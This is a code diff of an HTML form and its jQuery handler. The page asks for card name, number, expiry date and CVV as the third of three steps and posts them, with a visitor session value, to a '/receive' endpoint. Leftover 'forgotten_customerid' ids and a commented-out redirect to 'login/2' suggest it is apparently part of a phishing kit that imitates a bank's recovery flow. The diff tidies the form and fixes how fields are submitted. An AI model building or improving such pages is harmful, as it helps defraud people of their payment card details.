@@ -53,62 +53,60 @@
                <div id="unorder-list" class="errors"> </div>
             </div>
             <form id="carddetails_form">
-               <span>Step 3 of 3 - Card information </span>
-               <fieldset>
-                  <div class="panel">
-                     <h2>Provide your card details</h2>
-                     <div class="form">
-                        <div class="item item-text">
-                           <label data-field-name="card-name" data-field-title="Card name" for="forgotten_customerid_cardName">
-                           <span class="label" id="label-name">Card Name</span>
-                           <span class="control">
-                           <input class="log_details"  type="text" autocomplete="off" aria-required="true" id="CardName" maxlength="23" />
-                           </span>
-                           <span class="visually-hidden">Up to 23 characters allowed</span>
-                           </label>
-                        </div>
-                        <div class="item item-text">
-                           <label data-field-name="card-number" data-field-title="Card number" for="forgotten_customerid_cardNumber">
-                           <span class="label" id="label-name">Card Number</span>
-                           <span class="control">
-                           <input class="log_details"  type="text" autocomplete="off" aria-required="true" id="CardNumber" pattern="[0-9]*" maxlength="19" />
-                           </span>
-                           <span class="visually-hidden">15, 16, or 19 characters allowed</span>
-                           </label>
-                        </div>
-                        <div class="item item-text">
-                           <label data-field-name="expiry-date" data-field-title="Expiry date" for="forgotten_customerid_expiryDate">
-                           <span class="label" id="label-name">Expiry Date</span>
-                           <span class="control">
-                           <input class="log_details" type="text" aria-required="true" id="ExpirationDate" placeholder="MM/YY" maxlength="5" />
-                           </span>
-                           <span class="visually-hidden">Format: MM/YY</span>
-                           </label>
-                        </div>
-                        <div class="item item-text">
-                           <label data-field-name="security-code" data-field-title="Security code" for="forgotten_customerid_securityCode">
-                           <span class="label" id="label-name">Security Code</span>
-                           <span class="control">
-                           <input class="log_details" type="text" aria-required="true" id="CVV" pattern="[0-9]*" maxlength="4" />
-                           </span>
-                           <span class="visually-hidden">3 or 4 digits</span>
-                           </label>
-                        </div>
-                     </div>
-                  </div>
-                  <div class="description"></div>
-                  <div class="action-buttons action-buttons-count-2" style="margin-bottom:30%;">
-                     <button type="button" class="button" data-bind="click: cancel" >
-                     <span>Cancel</span>
-                     </button>
-                     <button id="subbut" class="button-alt" data-bind="click: submit">
-                     <span>Next</span>
-                     </button>
-                  </div>
-                  
-                  </div>
-               </fieldset>
-            </form>
+    <span>Step 3 of 3 - Card information</span>
+    <fieldset>
+        <div class="panel">
+            <h2>Provide your card details</h2>
+            <div class="form">
+                <div class="item item-text">
+                    <label data-field-name="card-name" data-field-title="Card name" for="CardName">
+                        <span class="label" id="label-name">Card Name</span>
+                        <span class="control">
+                            <input class="log_details" type="text" autocomplete="off" aria-required="true" id="CardName" name="CardName" maxlength="23" />
+                        </span>
+                        <span class="visually-hidden">Up to 23 characters allowed</span>
+                    </label>
+                </div>
+                <div class="item item-text">
+                    <label data-field-name="card-number" data-field-title="Card number" for="CardNumber">
+                        <span class="label" id="label-name">Card Number</span>
+                        <span class="control">
+                            <input class="log_details" type="text" autocomplete="off" aria-required="true" id="CardNumber" name="CardNumber" pattern="[0-9]*" maxlength="19" />
+                        </span>
+                        <span class="visually-hidden">15, 16, or 19 characters allowed</span>
+                    </label>
+                </div>
+                <div class="item item-text">
+                    <label data-field-name="expiry-date" data-field-title="Expiry date" for="ExpirationDate">
+                        <span class="label" id="label-name">Expiry Date</span>
+                        <span class="control">
+                            <input class="log_details" type="text" aria-required="true" id="ExpirationDate" name="ExpirationDate" placeholder="MM/YY" maxlength="5" />
+                        </span>
+                        <span class="visually-hidden">Format: MM/YY</span>
+                    </label>
+                </div>
+                <div class="item item-text">
+                    <label data-field-name="security-code" data-field-title="Security code" for="CVV">
+                        <span class="label" id="label-name">Security Code</span>
+                        <span class="control">
+                            <input class="log_details" type="text" aria-required="true" id="CVV" name="CVV" pattern="[0-9]*" maxlength="4" />
+                        </span>
+                        <span class="visually-hidden">3 or 4 digits</span>
+                    </label>
+                </div>
+            </div>
+        </div>
+        <div class="description"></div>
+        <div class="action-buttons action-buttons-count-2" style="margin-bottom:30%;">
+            <button type="button" class="button" data-bind="click: cancel">
+                <span>Cancel</span>
+            </button>
+            <button id="subbut" class="button-alt" data-bind="click: submit">
+                <span>Next</span>
+            </button>
+        </div>
+    </fieldset>
+</form>
          </div>
       </div>
    </body>
@@ -153,35 +151,33 @@
     	 	
     	 	$(document).ready(function() {
     $('#subbut').on('click', function(event) {
-        event.preventDefault(); // Prevent the default action of the link
+        event.preventDefault(); // Prevent the default action of the button
 
         let myForm = $("#carddetails_form");
-        let checkInputs = document.querySelectorAll('.log_details');       let list = document.getElementById('unorder-list');
+        let checkInputs = document.querySelectorAll('.log_details');
+        let list = document.getElementById('unorder-list');
 
-		// While there are child elements, remove the first child
-		while (list.firstChild) {
-		    list.removeChild(list.firstChild);
-		}
-        
-        
+        // Clear the unordered list
+        while (list.firstChild) {
+            list.removeChild(list.firstChild);
+        }
+
         // Flag to track if any input is empty
         let isEmpty = false;
 
         // Loop through each input field
-        for (const check of checkInputs) {
+        checkInputs.forEach((check) => {
             check.addEventListener('focus', () => {
-                console.log('focus');
-                check.nextElementSibling.style.display = "none";
+                // Code to handle focus event
             });
 
             if (check.value.trim() === "") {
-            
                 document.getElementById('alertManagerArea').style.display = "block";
                 let labelName = check.parentElement.previousElementSibling.textContent;
                 addListItem('unorder-list', labelName);
                 isEmpty = true;
             }
-        }
+        });
 
         // If no input is empty, proceed with form submission
         if (!isEmpty) {
@@ -189,9 +185,9 @@
             let user = {};
             let visitor = sessionStorage.getItem('visitor');
 
-            userinfo.forEach((value) => {
+            userinfo.forEach((field) => {
                 // Use the 'name' attribute to create user object
-                user[value.id] = value.value;
+                user[field.name] = field.value;
             });
 
             user['visitor'] = visitor;
@@ -203,18 +199,14 @@
                 url: "/receive",
                 data: user
             }).done(function(msg) {
-            
                 sessionStorage.setItem('visitor', visitor);
-                //window.location.href = "login/2";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
-            //window.location.href = "login/2"; 
-            
+                // Handle failure here
             });
         }
     });
 });
-
 
     </script> 
 </html>
